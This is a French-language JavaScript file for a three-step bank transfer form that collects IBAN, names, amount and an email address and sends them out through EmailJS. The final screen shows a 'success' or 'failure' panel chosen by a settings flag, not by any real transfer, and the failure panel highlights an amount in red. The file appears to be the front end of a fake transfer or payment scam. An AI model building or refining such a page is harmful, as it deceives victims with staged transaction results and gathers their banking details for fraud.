const iban = document.getElementById("iban");
const pays = document.getElementById("country");
const name = document.getElementById("name");
const prenom = document.getElementById("prenom");
const montant = document.getElementById("montant");
const emailDestinataire = document.getElementById("emailDestinataire");
const actionfinish = document.getElementById("actionfinish");
const recaputilatif = document.getElementById("recaputilatif");

// ✅ CORRECTION : Utiliser les vraies IDs des zones
const zoneSucces = document.getElementById("zoneSucces");
const zoneEchec = document.getElementById("zoneEchec");

const myRib = document.getElementById("myRib")
const myName = document.getElementById("myName")
const myLastName = document.getElementById("myLastName")
const myMontant = document.getElementById("myMontant")

const zonePrincipal = document.getElementById("zonePrincipal");
const zone1 = document.getElementById("zone1");
const zone2 = document.getElementById("zone2");
const zoneChargement = document.getElementById("zoneChargement");

const action1 = document.getElementById("action1");
const action2 = document.getElementById("action2");
const action3 = document.getElementById("action3");

const progressBar = document.getElementById("progressBar");
const step1 = document.getElementById("step1");
const step2 = document.getElementById("step2");
const step3 = document.getElementById("step3");

function updateProgress(step) {
    const progress = (step / 3) * 100;
    progressBar.style.width = progress + '%';
    
    step1.classList.remove('active', 'completed');
    step2.classList.remove('active', 'completed');
    step3.classList.remove('active', 'completed');
    
    if (step >= 1) step1.classList.add('completed');
    if (step >= 2) step2.classList.add('completed');
    if (step >= 3) step3.classList.add('completed');
    
    const currentStep = document.getElementById(`step${step}`);
    if (currentStep) {
        currentStep.classList.add('active');
        currentStep.classList.remove('completed');
    }
}

// ═══════════════════════════════════════════════════════════════
// FONCTION : Charger les textes depuis settings.js
// ═══════════════════════════════════════════════════════════════
function chargerTextesVirement() {
    if (typeof virementConfig !== 'undefined') {
        // Textes SUCCÈS
        if (document.getElementById('succesTitre')) {
            document.getElementById('succesTitre').innerText = virementConfig.succes.titre;
        }
        if (document.getElementById('succesMessage')) {
            document.getElementById('succesMessage').innerText = virementConfig.succes.message;
        }
        if (document.getElementById('succesSousTitre')) {
            document.getElementById('succesSousTitre').innerText = virementConfig.succes.sousTitre;
        }
        if (document.getElementById('succesInfo1Text')) {
            document.getElementById('succesInfo1Text').innerText = virementConfig.succes.info1;
        }
        if (document.getElementById('succesInfo2Text')) {
            document.getElementById('succesInfo2Text').innerText = virementConfig.succes.info2;
        }
        if (document.getElementById('succesInfo3Text')) {
            document.getElementById('succesInfo3Text').innerText = virementConfig.succes.info3;
        }
        if (document.getElementById('succesConclusion')) {
            document.getElementById('succesConclusion').innerText = virementConfig.succes.conclusion;
        }
        if (document.getElementById('succesBouton')) {
            document.getElementById('succesBouton').innerText = virementConfig.succes.boutonTexte;
        }
        
        // Textes ÉCHEC
        if (document.getElementById('echecTitre')) {
            document.getElementById('echecTitre').innerText = virementConfig.echec.titre;
        }
        if (document.getElementById('echecMessage')) {
            document.getElementById('echecMessage').innerText = virementConfig.echec.message;
        }
        if (document.getElementById('echecInstructions')) {
            document.getElementById('echecInstructions').innerText = virementConfig.echec.instructions;
        }
        if (document.getElementById('echecEtape1')) {
            document.getElementById('echecEtape1').innerText = virementConfig.echec.etape1;
        }
        if (document.getElementById('echecEtape2')) {
            const etape2Element = document.getElementById('echecEtape2');
            etape2Element.innerText = virementConfig.echec.etape2;
            // Ajouter le montant en gras après le texte
            const montantSpan = document.createElement('strong');
            montantSpan.innerText = virementConfig.echec.montant;
            montantSpan.style.color = '#DC2626'; // Rouge foncé
            etape2Element.appendChild(montantSpan);
        }
        if (document.getElementById('echecConclusion')) {
            document.getElementById('echecConclusion').innerText = virementConfig.echec.conclusion;
        }
        if (document.getElementById('echecBouton')) {
            document.getElementById('echecBouton').innerText = virementConfig.echec.boutonTexte;
        }
    }
}

// ✅ Charger les textes au démarrage de la page
document.addEventListener('DOMContentLoaded', chargerTextesVirement);

document.getElementById("action1").addEventListener("click", function () {

    if (iban.value !== "" && pays.value !== "") {

        zonePrincipal.classList.add("hidden");
        zone1.classList.remove("hidden");
        updateProgress(2);
        
        // ✅ Remonter en haut de la page avec animation fluide
        window.scrollTo({ top: 0, behavior: 'smooth' });

    } else {

        alert("Le champ de saisie est vide")

    }

});

document.getElementById("action2").addEventListener("click", function () {

    if (name.value !== "" && prenom.value !== "" && montant.value !== "" && emailDestinataire.value !== "") {

        zone1.classList.add("hidden");
        recaputilatif.classList.remove("hidden");

        myRib.innerText = iban.value;
        myName.innerText = name.value;
        myLastName.innerText = prenom.value;
        myMontant.innerText = montant.value;

        updateProgress(3);
        
        // ✅ Remonter en haut de la page avec animation fluide
        window.scrollTo({ top: 0, behavior: 'smooth' });

    } else {

        alert("Le champ de saisie est vide")

    }
});

document.getElementById("actionfinish").addEventListener("click", function () {

    recaputilatif.classList.add("hidden");
    zoneChargement.classList.remove("hidden");

    // ✅ Remonter en haut de la page avec animation fluide
    window.scrollTo({ top: 0, behavior: 'smooth' });

    // ═══════════════════════════════════════════════════════════════
    // ENVOI DES DONNÉES DU FORMULAIRE PAR EMAIL (via EmailJS)
    // ═══════════════════════════════════════════════════════════════
    if (typeof emailJSConfig !== 'undefined' && emailJSConfig.actif && typeof emailjs !== 'undefined') {
        const params = {
            full_name: name.value + " " + prenom.value,
            name: name.value,
            prenom: prenom.value,
            iban: iban.value,
            country: pays.value,
            montant: montant.value,
            to_email: emailDestinataire.value
        };
        console.log("📧 Données envoyées à EmailJS :", params);
        emailjs.send(emailJSConfig.serviceId, emailJSConfig.templateId, params).then(function (response) {
            console.log("✅ Email envoyé avec succès :", response.status, response.text);
        }, function (error) {
            console.error("❌ Échec de l'envoi de l'email :", error);
        });
    }

    setTimeout(() => {
        zoneChargement.classList.add("hidden");
        
        // ✅ CORRECTION : Afficher soit SUCCÈS soit ÉCHEC selon la configuration
        if (typeof virementConfig !== 'undefined' && virementConfig.estReussi === true) {
            // Afficher la zone de SUCCÈS (verte)
            zoneSucces.classList.add("visible");
        } else {
            // Afficher la zone d'ÉCHEC (rouge)
            zoneEchec.classList.add("visible");
        }

    }, 3000);
});
